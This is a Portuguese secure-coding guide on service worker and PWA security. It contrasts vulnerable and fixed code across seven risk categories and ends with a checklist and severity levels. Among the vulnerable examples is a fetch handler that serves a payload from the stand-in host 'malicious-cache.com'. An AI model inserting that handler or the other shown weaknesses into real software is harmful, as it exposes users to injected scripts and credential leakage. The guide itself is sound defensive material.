# Service Workers / PWA — Segurança

> Service workers correm em background, intercetam pedidos de rede, e persistem no browser independentemente da página. Vetor poderoso e silencioso para ataques se mal protegidos.

## Quando carregar

- `service-worker.js`, `sw.js` na raiz ou `public/`
- `manifest.webmanifest` ou `manifest.json` (não confundir com browser extension manifest)
- `package.json` com `workbox-*`, `next-pwa`, `vite-plugin-pwa`
- Registo: `navigator.serviceWorker.register(...)`

## Mindset

- **Service worker permanece ativo** mesmo depois do user fechar tab
- **Inteceta TODOS os fetch/network** dentro do scope — pode reescrever responses
- **Cache controla o que o user vê** — cache poisoning = persistent UI compromise
- **Push notifications** podem chegar quando app está fechada
- **Background sync** corre offline + online — pode exfiltrate data later
- **Update model lazy** — user pode estar a ver código antigo dias

## 7 categorias

### 1. Service worker scope demasiado amplo

**BAD** — register sem scope:
```javascript
navigator.serviceWorker.register('/sw.js');
// Scope = / (controla TODA a origem)
```

Subdiretório `/uploads/user-content/` que serve UGC fica controlado pelo SW. Se SW vazar a UGC, pode injetar SW malicioso.

**GOOD** — scope específico:
```javascript
navigator.serviceWorker.register('/app/sw.js', { scope: '/app/' });
```

E HTTP header `Service-Worker-Allowed: /app/` se SW estiver fora do scope nominal.

### 2. fetch handler sem origin validation

**BAD**:
```javascript
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.pathname === '/api/inject') {
    event.respondWith(fetch('https://malicious-cache.com/payload.js'));
  }
});
```

Se atacante consegue injetar SW (via XSS persistent ou comprometer build), todo o fetch da app fica comprometido.

**GOOD** — SW só serve do mesmo origin, e respeita scope:
```javascript
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.origin !== self.location.origin) {
    return;  // não interceta cross-origin
  }
  event.respondWith(handleSameOrigin(event));
});
```

### 3. Cache poisoning via stale data

**BAD** — cache-first sem expiration:
```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request).then(r => r || fetch(event.request))
  );
});
```

Atacante injeta uma vez via MITM (hotel WiFi sem HSTS) → cache permanente até user limpar.

**GOOD** — network-first para HTML, cache-first com TTL para assets imutáveis (com hash no nome):
```javascript
const ASSET_CACHE = 'assets-v2025-05';

self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);

  // HTML: sempre network-first
  if (event.request.mode === 'navigate') {
    event.respondWith(
      fetch(event.request).catch(() => caches.match('/offline.html'))
    );
    return;
  }

  // Assets imutáveis (hash no nome): cache-first
  if (/\/static\/.+\.[a-f0-9]{8}\./.test(url.pathname)) {
    event.respondWith(
      caches.match(event.request).then(r =>
        r || fetch(event.request).then(resp => {
          const copy = resp.clone();
          caches.open(ASSET_CACHE).then(c => c.put(event.request, copy));
          return resp;
        })
      )
    );
  }
});
```

### 4. SW serve credentials inadvertidamente

**BAD**:
```javascript
self.addEventListener('fetch', event => {
  if (event.request.url.includes('/api/')) {
    event.respondWith(
      fetch(event.request, { credentials: 'include' })
    );
  }
});
```

Se SW estiver registado em domínio que NÃO é o API domain, `credentials: 'include'` envia cookies para o errado.

**GOOD** — respeitar credentials originais ou explicit `same-origin`:
```javascript
event.respondWith(
  fetch(event.request, { credentials: 'same-origin' })
);
```

### 5. Push subscription sem auth

**BAD** — backend aceita qualquer subscription:
```javascript
app.post('/subscribe', (req, res) => {
  pushSubscriptions.save(req.body);  // sem user check
  res.send('ok');
});
```

Atacante regista subscription com `endpoint` controlado, depois exfiltrata via push.

**GOOD** — subscription ligada a user autenticado:
```javascript
app.post('/subscribe', requireAuth, async (req, res) => {
  const { endpoint, keys } = req.body;
  if (!endpoint.startsWith('https://')) return res.sendStatus(400);
  await pushSubscriptions.upsert({
    userId: req.user.id,
    endpoint, p256dh: keys.p256dh, auth: keys.auth
  });
  res.send('ok');
});
```

### 6. Notification spam / fishing

Notifications via SW são clicáveis e podem abrir URLs. Atacante regista SW + push permission, depois envia push pretending to be do banco do user.

**Mitigação:**
- Pedir push permission **só quando user faz ação explícita** (não no page load)
- `actions` da notification têm URLs que o SW abre — validar antes:
```javascript
self.addEventListener('notificationclick', event => {
  const url = event.notification.data.url;
  if (!url.startsWith(self.location.origin)) return;
  event.waitUntil(clients.openWindow(url));
});
```

### 7. Update via update() sem signing

Service workers atualizam quando o browser detecta change no SW file (byte-different). Sem versioning seguro:
- Atacante MITM (sem HSTS preload) substitui SW.js
- User permanece com SW comprometido por dias

**Mitigação:**
- HSTS preload + HTTPS estrito
- SW serve com `Cache-Control: max-age=0` (browser sempre revalida)
- Subresource Integrity: SW é serviço primário, mas se carrega scripts externos via `importScripts`, validar com SRI ou hashes

## Manifest WebApp

```json
{
  "name": "App",
  "scope": "/app/",
  "start_url": "/app/",
  "display": "standalone",
  "icons": [...],
  "permissions": ["push", "notifications"]
}
```

Confirma `scope` mínimo. Manifest.json pode autorizar capabilities (background sync, etc.).

## Quick wins

- [ ] SW scope mínimo necessário
- [ ] fetch handler valida origin (só same-origin se aplicável)
- [ ] HTML sempre network-first ou stale-while-revalidate, não cache-first
- [ ] Assets imutáveis identificados por hash no path
- [ ] `credentials` explícito (`same-origin` ou `omit`, não `include` cego)
- [ ] Push subscriptions ligadas a user autenticado
- [ ] Push permission pedida em user action, não page load
- [ ] Notification click só abre URLs same-origin
- [ ] HSTS preload + HTTPS estrito (sem `http://`)
- [ ] SW file servido com `Cache-Control: no-cache`
- [ ] `importScripts` apenas de same-origin
- [ ] Versioning explícito de caches (rotate em deploy)
- [ ] CSP do site permite SW (`worker-src 'self'`)
- [ ] Sem `eval` no SW (CSP do SW herda do registration)

## Falsos positivos

- SW em scope `/` para PWA single-page app — esperado
- `cache-first` para assets com hash no nome — pattern correto
- `credentials: 'include'` para SW de mesma origem que API — pode ser legítimo

## Severidade típica

- **Crítico** — SW que serve responses maliciosas para qualquer fetch da app, push subscription sem auth
- **Alto** — cache poisoning persistente, notification phishing aberto
- **Médio** — scope demasiado amplo, credentials cego
- **Baixo** — manifest sem scope explícito

## Cross-references

- [`../analises/16-headers-http.md`](../analises/16-headers-http.md) — HSTS, CSP
- [`../analises/xss.md`](../analises/xss.md) — vetores que injetam SW
- [`../analises/17-dependencias.md`](../analises/17-dependencias.md) — workbox/next-pwa supply chain
- [`../linguagens/javascript-typescript.md`](../linguagens/javascript-typescript.md)

## Recursos

- [Service Worker Security Considerations](https://www.w3.org/TR/service-workers/#security-considerations)
- [Workbox Best Practices](https://developer.chrome.com/docs/workbox/)
